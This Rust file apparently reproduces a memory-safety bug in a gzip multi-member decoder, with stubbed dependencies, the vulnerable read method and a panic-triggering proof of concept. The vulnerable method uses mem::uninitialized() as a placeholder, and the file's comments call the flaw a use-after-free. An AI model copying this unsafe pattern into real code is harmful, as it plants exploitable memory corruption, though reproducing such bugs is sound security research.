// SECTION 1: MINIMAL DEPENDENCIES

use std::io::{self, Read};
use std::mem;
use byteorder::{LittleEndian, ReadBytesExt};

mod deflate {
    use std::io;
    #[derive(Debug)]
    pub struct Decoder<R> {
        reader: R,
    }
    impl<R: io::Read> Decoder<R> {
        pub fn new(reader: R) -> Self { Self { reader } }
        pub fn into_inner(self) -> R { self.reader }
        pub fn read(&mut self, _buf: &mut [u8]) -> io::Result<usize> {
            Ok(0) // Return 0 to enter the vulnerable path.
        }
    }
}

mod checksum {
    #[derive(Debug, Default)]
    pub struct Crc32;
    impl Crc32 {
        pub fn new() -> Self { Self }
    }
}

const GZIP_ID: [u8; 2] = [0x1f, 0x8b];
const COMPRESSION_METHOD_DEFLATE: u8 = 8;
const F_EXTRA: u8 = 0b0000_0100;
const F_NAME: u8 = 0b0000_1000;
const F_COMMENT: u8 = 0b0001_0000;
const F_HCRC: u8 = 0b0000_0010;

#[derive(Debug, Clone, Default)]
pub struct CString(Vec<u8>);

#[derive(Debug, Clone, Default)]
pub struct ExtraField;
impl ExtraField {
    fn read_from<R: Read>(_reader: R) -> io::Result<Self> {
        Ok(ExtraField)
    }
}

#[derive(Debug, Clone, Copy, Default)]
pub enum CompressionLevel { #[default] Unknown }
impl CompressionLevel {
    fn from_u8(_n: u8) -> Self { CompressionLevel::Unknown }
}

#[derive(Debug, Clone, Copy, Default)]
pub enum Os { #[default] Unknown }
impl Os {
    fn from_u8(_n: u8) -> Self { Os::Unknown }
}

#[derive(Debug, Clone, Default)]
pub struct Header {
    modification_time: u32,
    compression_level: CompressionLevel,
    os: Os,
    is_text: bool,
    is_verified: bool,
    extra_field: Option<ExtraField>,
    filename: Option<CString>,
    comment: Option<CString>,
}

impl Header {
    pub fn read_from<R>(mut reader: R) -> io::Result<Self>
    where
        R: io::Read + ReadBytesExt,
    {
        let mut this = Header::default();
        let mut id = [0; 2];
        reader.read_exact(&mut id)?; // The panic is triggered here.
        if id != GZIP_ID {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "Unexpected GZIP ID"));
        }
        let compression_method = reader.read_u8()?;
        if compression_method != COMPRESSION_METHOD_DEFLATE {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "Unsupported compression method"));
        }
        let flags = reader.read_u8()?;
        this.modification_time = reader.read_u32::<LittleEndian>()?;
        this.compression_level = CompressionLevel::from_u8(reader.read_u8()?);
        this.os = Os::from_u8(reader.read_u8()?);
        if flags & F_EXTRA != 0 {
            this.extra_field = Some(ExtraField::read_from(&mut reader)?);
        }
        if flags & F_NAME != 0 {
            this.filename = Some(read_cstring(&mut reader)?);
        }
        if flags & F_COMMENT != 0 {
            this.comment = Some(read_cstring(&mut reader)?);
        }
        if flags & F_HCRC != 0 {
            let _crc = reader.read_u16::<LittleEndian>()?;
            this.is_verified = true;
        }
        Ok(this)
    }
}

fn read_cstring<R: Read + ReadBytesExt>(mut reader: R) -> io::Result<CString> {
    let mut buf = Vec::new();
    loop {
        let b = reader.read_u8()?;
        if b == 0 { break; }
        buf.push(b);
    }
    Ok(CString(buf))
}

#[derive(Debug)]
pub struct Decoder<R> {
    header: Header,
    reader: deflate::Decoder<R>,
    crc32: checksum::Crc32,
    eos: bool,
}

impl<R: Read> Decoder<R> {
    pub fn with_header(reader: R, header: Header) -> Self {
        Decoder {
            header,
            reader: deflate::Decoder::new(reader),
            crc32: checksum::Crc32::new(),
            eos: false,
        }
    }
    pub fn into_inner(self) -> R { self.reader.into_inner() }
    pub fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> { self.reader.read(buf) }
}

#[derive(Debug)]
pub struct MultiDecoder<R> {
    header: Header,
    decoder: Result<Decoder<R>, R>,
}

// SECTION 2: VULNERABLE CODE
#[allow(deprecated)]
impl<R> io::Read for MultiDecoder<R>
where
    R: io::Read + ReadBytesExt,
{
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        let read_size = match self.decoder {
            Err(_) => return Ok(0),
            Ok(ref mut decoder) => decoder.read(buf)?,
        };
        if read_size == 0 {
            let mut reader = mem::replace(&mut self.decoder, Err(unsafe { mem::uninitialized() }))
                .ok()
                .take()
                .expect("Never fails")
                .into_inner();
            match Header::read_from(&mut reader) {
                Err(e) => {
                    mem::forget(mem::replace(&mut self.decoder, Err(reader)));
                    if e.kind() == io::ErrorKind::UnexpectedEof {
                        Ok(0)
                    } else {
                        Err(e)
                    }
                }
                Ok(header) => {
                    self.header = header.clone();
                    mem::forget(mem::replace(
                        &mut self.decoder,
                        Ok(Decoder::with_header(reader, header)),
                    ));
                    self.read(buf)
                }
            }
        } else {
            Ok(read_size)
        }
    }
}

// SECTION 3: PROOF-OF-CONCEPT

// A reader that panics to trigger the vulnerability.
struct PanicReader;

impl Read for PanicReader {
    fn read(&mut self, _buf: &mut [u8]) -> io::Result<usize> {
        panic!("Simulating panic during header reading to trigger UAF");
    }
}

fn main() {
    // 1. Setup a reader that will panic.
    let panic_reader = PanicReader;

    // 2. Setup the vulnerable object.
    let mut vulnerable_decoder = MultiDecoder {
        header: Header::default(),
        decoder: Ok(Decoder {
            header: Header::default(),
            reader: deflate::Decoder::new(panic_reader),
            crc32: checksum::Crc32::new(),
            eos: false,
        }),
    };

    // 3. Trigger the bug by calling read().
    let result = std::panic::catch_unwind(move || {
        let mut buf = [0; 1];
        let _ = vulnerable_decoder.read(&mut buf);
    });

    // 4. Verify the panic was triggered.
    assert!(result.is_err(), "The panic was not triggered, UAF not demonstrated.");
    println!("Successfully triggered panic, demonstrating the Use-After-Free condition.");
}